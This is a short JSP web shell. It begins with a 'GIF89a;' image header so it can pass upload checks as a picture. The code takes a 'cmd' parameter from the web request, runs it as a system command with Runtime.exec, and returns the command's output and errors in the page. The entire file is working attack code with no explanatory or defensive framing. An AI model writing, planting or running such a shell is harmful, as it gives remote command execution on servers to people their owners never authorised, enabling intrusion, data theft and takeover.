GIF89a;
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    String output = "";

    out.println("CMD Param: " + cmd + "<br>");

    if (cmd != null) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);

            // Get stdout
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
            // Get stderr
            BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));

            String s;
            output += "<strong>STDOUT:</strong><br>";
            while ((s = stdInput.readLine()) != null) {
                output += s + "<br>";
            }

            output += "<br><strong>STDERR:</strong><br>";
            while ((s = stdError.readLine()) != null) {
                output += s + "<br>";
            }

        } catch (IOException e) {
            output = "ERROR: " + e.getMessage();
        }
    }
%>

<%=output %>

